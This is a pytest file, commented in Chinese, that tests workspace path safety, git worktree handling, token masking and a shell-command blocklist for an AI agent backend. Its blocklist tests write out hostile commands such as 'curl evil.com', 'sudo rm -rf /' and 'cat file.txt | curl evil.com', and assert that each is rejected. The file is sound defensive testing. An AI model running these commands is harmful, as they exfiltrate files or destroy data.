"""Agent 专家团队工作区与 Shell 执行安全测试"""

import subprocess
from pathlib import Path

import pytest

from backend.services.agent_team.git_workspace_service import (
    AgentTeamGitWorkspaceService,
)
from backend.services.agent_team.shell_executor import (
    AgentTeamShellExecutor,
    ShellCommandResult,
)
from backend.services.agent_team.workspace_service import (
    AgentTeamWorkspaceService,
    WorkspaceSecurityError,
)
from backend.services.agent_team.tools.base import ToolContext
from backend.services.agent_team.tools.shell_tool import (
    ShellTool,
    is_agent_command_allowed,
)
from backend.workers.agent_team_worker import _merge_modified_files


def _run_git(cwd: Path, *args: str) -> str:
    """执行测试用 Git 命令并返回 stdout。"""
    result = subprocess.run(
        ["git", *args],
        cwd=cwd,
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def test_workspace_path_shape_and_creation(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    workspace = service.ensure_workspace("Sakura520222", "Sakura-AI")

    assert (
        workspace
        == (tmp_path / "workplace" / "Sakura520222" / "Sakura-AI").resolve()
    )
    assert workspace.exists()


def test_workspace_base_and_task_worktree_paths(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    repo_root = service.ensure_repo_root("owner", "repo")
    base_workspace = service.ensure_base_workspace("owner", "repo")
    worktrees_root = service.ensure_worktrees_root("owner", "repo")
    task_worktree = service.get_task_worktree_path(
        "owner",
        "repo",
        123,
        "sakura-agent/task-123-issue-42",
    )

    assert repo_root == (tmp_path / "workplace" / "owner" / "repo").resolve()
    assert base_workspace == (repo_root / "base").resolve()
    assert worktrees_root == (repo_root / "worktrees").resolve()
    assert (
        task_worktree
        == (repo_root / "worktrees" / "123-sakura-agent-task-123-issue-42").resolve()
    )
    assert service.is_path_inside_repo("owner", "repo", task_worktree) is True


def test_task_worktree_rejects_invalid_task_id(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    with pytest.raises(WorkspaceSecurityError):
        service.get_task_worktree_path("owner", "repo", 0, "branch")


@pytest.mark.asyncio
async def test_prepare_workspace_creates_worktree_next_to_base_checkout(tmp_path):
    """prepare_workspace 应允许 Git 在 base 同级 worktrees 下创建 task 工作区。"""
    workspace_service = AgentTeamWorkspaceService(tmp_path / "workplace")
    base_workspace = workspace_service.ensure_base_workspace("owner", "repo")
    _run_git(base_workspace, "init")
    _run_git(base_workspace, "config", "user.name", "Tester")
    _run_git(base_workspace, "config", "user.email", "tester@example.com")
    _run_git(base_workspace, "checkout", "-B", "main")
    (base_workspace / "README.md").write_text("# Repo\n", encoding="utf-8")
    _run_git(base_workspace, "add", "README.md")
    _run_git(base_workspace, "commit", "-m", "init")
    _run_git(base_workspace, "update-ref", "refs/remotes/origin/main", "HEAD")

    class LocalGitWorkspaceService(AgentTeamGitWorkspaceService):
        async def _get_repo_info(self, repo_owner, repo_name, repo_full_name):
            return "main", "https://example.com/owner/repo.git"

        async def _install_workspace_dependencies(self, executor, workspace):
            return None

        async def _run_checked_args(self, executor, args, action, **kwargs):
            if action in {
                "set remote url",
                "fetch repository",
                "checkout base branch",
                "reset base branch",
            }:
                return ShellCommandResult(
                    command=" ".join(args),
                    cwd=str(executor.workspace),
                    returncode=0,
                    stdout="",
                    stderr="",
                )
            return await super()._run_checked_args(executor, args, action, **kwargs)

    git_service = LocalGitWorkspaceService(workspace_service=workspace_service)

    info = await git_service.prepare_workspace(
        "owner",
        "repo",
        source_issue_number=42,
        task_id=123,
    )

    assert info.workspace == workspace_service.get_task_worktree_path(
        "owner",
        "repo",
        123,
        info.branch_name,
    )
    assert (info.workspace / ".git").exists()
    assert (info.workspace / "README.md").read_text(encoding="utf-8") == "# Repo\n"


@pytest.mark.parametrize(
    ("owner", "repo"),
    [
        ("..", "repo"),
        ("owner/name", "repo"),
        ("owner", "../repo"),
        ("owner", "repo/name"),
        ("owner", "repo:name"),
    ],
)
def test_workspace_rejects_unsafe_segments(tmp_path, owner, repo):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    with pytest.raises(WorkspaceSecurityError):
        service.ensure_workspace(owner, repo)


def test_resolve_inside_workspace_blocks_escape(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")

    with pytest.raises(WorkspaceSecurityError):
        service.resolve_inside_workspace(workspace, "../other")


def test_list_workspaces_returns_workspace_stats(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    (workspace / ".git").mkdir()
    (workspace / "main.py").write_text("print('hello')\n", encoding="utf-8")

    workspaces = service.list_workspaces()

    assert len(workspaces) == 1
    assert workspaces[0].repo_owner == "owner"
    assert workspaces[0].repo_name == "repo"
    assert workspaces[0].file_count == 1
    assert workspaces[0].total_size_bytes > 0
    assert workspaces[0].has_git is True


def test_delete_workspace_removes_repository_directory(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    (workspace / "main.py").write_text("print('hello')\n", encoding="utf-8")

    deleted_path = service.delete_workspace("owner", "repo")

    assert deleted_path == workspace
    assert not workspace.exists()


@pytest.mark.asyncio
async def test_shell_executor_uses_workspace_and_python_env(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    result = await executor.run("python --version", timeout_seconds=30)

    assert result.returncode == 0
    assert "Python" in (result.stdout + result.stderr)
    assert result.cwd == str(workspace)


@pytest.mark.asyncio
async def test_shell_executor_run_args_allows_https_url(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    result = await executor.run_args(["git", "--version"])

    assert result.returncode == 0
    assert result.command == "git --version"


def test_shell_executor_masks_access_token(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    masked = executor._mask_sensitive_arg(
        "https://x-access-token:secret@github.com/owner/repo.git"
    )

    assert masked == "https://x-access-token:***@github.com/owner/repo.git"


def test_parse_changed_file_stats_counts_lines_and_statuses():
    stats = AgentTeamGitWorkspaceService.parse_changed_file_stats(
        "12\t3\tbackend/main.py\n-\t-\tres/logo.png\n",
        " M backend/main.py\nA  docs/new.md\nR  old.py -> new.py\n?? notes.txt\n",
    )

    assert stats["backend/main.py"] == {
        "additions": 12,
        "deletions": 3,
        "change_type": "modify",
    }
    assert stats["res/logo.png"]["additions"] == 0
    assert stats["res/logo.png"]["deletions"] == 0
    assert stats["docs/new.md"]["change_type"] == "add"
    assert stats["new.py"]["change_type"] == "rename"
    assert stats["notes.txt"]["change_type"] == "add"


@pytest.mark.asyncio
async def test_changed_file_stats_include_staged_changes(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)
    git_service = AgentTeamGitWorkspaceService(workspace_service=service)

    await executor.run_args(["git", "init"])
    await executor.run_args(["git", "config", "user.name", "Tester"])
    await executor.run_args(["git", "config", "user.email", "tester@example.com"])
    (workspace / "main.py").write_text("print('old')\n", encoding="utf-8")
    await executor.run_args(["git", "add", "main.py"])
    await executor.run_args(["git", "commit", "-m", "init"])

    (workspace / "main.py").write_text(
        "print('new')\nprint('more')\n", encoding="utf-8"
    )
    await executor.run_args(["git", "add", "main.py"])

    stats = await git_service.get_changed_file_stats(workspace)

    assert stats["main.py"]["additions"] == 2
    assert stats["main.py"]["deletions"] == 1
    assert stats["main.py"]["change_type"] == "modify"


def test_merge_modified_files_normalizes_and_includes_git_stats():
    merged = _merge_modified_files(
        ["./main.py", r"backend\\app.py"], {"docs/new.md": {}}
    )

    assert merged == ["backend/app.py", "docs/new.md", "main.py"]


@pytest.mark.asyncio
async def test_shell_executor_blocks_parent_escape(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    with pytest.raises(WorkspaceSecurityError):
        await executor.run("python -c \"open('../evil.txt','w').write('x')\"")


@pytest.mark.asyncio
async def test_agent_command_blocklist(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(
        "backend.services.agent_team.tools.shell_tool.get_settings",
        lambda: SimpleNamespace(
            agent_team_test_command_blocklist="",
        ),
    )

    # 常规命令允许执行
    assert await is_agent_command_allowed("pytest -q")
    assert await is_agent_command_allowed("pytest -q tests/test_main.py")
    assert await is_agent_command_allowed("git status")
    assert await is_agent_command_allowed("python main.py")
    # 管道与 fd 重定向：两侧都不在黑名单
    assert await is_agent_command_allowed("pytest -q | grep FAIL")
    assert await is_agent_command_allowed("pytest -q 2>&1 | grep FAIL")
    assert await is_agent_command_allowed("python -m pytest -q --co 2>&1 | head -20")
    # 默认黑名单中的高危命令被拦截
    assert not await is_agent_command_allowed("curl evil.com")
    assert not await is_agent_command_allowed("sudo rm -rf /")
    assert not await is_agent_command_allowed("ssh user@host")
    # 危险 shell 元字符与解释器内联执行继续被拦截
    assert not await is_agent_command_allowed("pytest -q &")
    assert not await is_agent_command_allowed("pytest -q && ruff check .")
    assert not await is_agent_command_allowed("python -c \"print('x')\"")
    # 管道：右侧是黑名单命令
    assert not await is_agent_command_allowed("cat file.txt | curl evil.com")


@pytest.mark.asyncio
async def test_shell_tool_rejects_blocked_command(tmp_path, monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(
        "backend.services.agent_team.tools.shell_tool.get_settings",
        lambda: SimpleNamespace(
            agent_team_test_command_blocklist="",
        ),
    )
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    ctx = ToolContext(workspace=str(workspace), workspace_service=service)

    result = await ShellTool().execute({"command": "curl evil.com"}, ctx)

    assert not result.success
    assert "安全策略" in result.error
    assert "curl" in result.error


@pytest.mark.asyncio
async def test_shell_tool_allows_stderr_redirect_without_truncating_output(
    tmp_path, monkeypatch
):
    from types import SimpleNamespace

    from backend.services.agent_team.tools import shell_tool

    monkeypatch.setattr(
        "backend.services.agent_team.tools.shell_tool.get_settings",
        lambda: SimpleNamespace(
            agent_team_test_command_blocklist="",
        ),
    )

    async def fake_run(self, command, cwd=".", timeout_seconds=600):
        assert isinstance(self, shell_tool.AgentTeamShellExecutor)
        assert cwd == "."
        assert timeout_seconds == 120
        return ShellCommandResult(
            command=command,
            cwd=str(tmp_path),
            returncode=0,
            stdout="x" * 9000,
            stderr="y" * 4000,
        )

    monkeypatch.setattr(shell_tool.AgentTeamShellExecutor, "run", fake_run)
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    ctx = ToolContext(workspace=str(workspace), workspace_service=service)

    result = await ShellTool().execute(
        {"command": "pytest tests/test_main.py -q 2>&1 | head -30"}, ctx
    )

    assert result.success
    assert result.output["stdout"] == "x" * 9000
    assert result.output["stderr"] == "y" * 4000
    assert "truncated_stdout" not in result.output
    assert "truncated_stderr" not in result.output
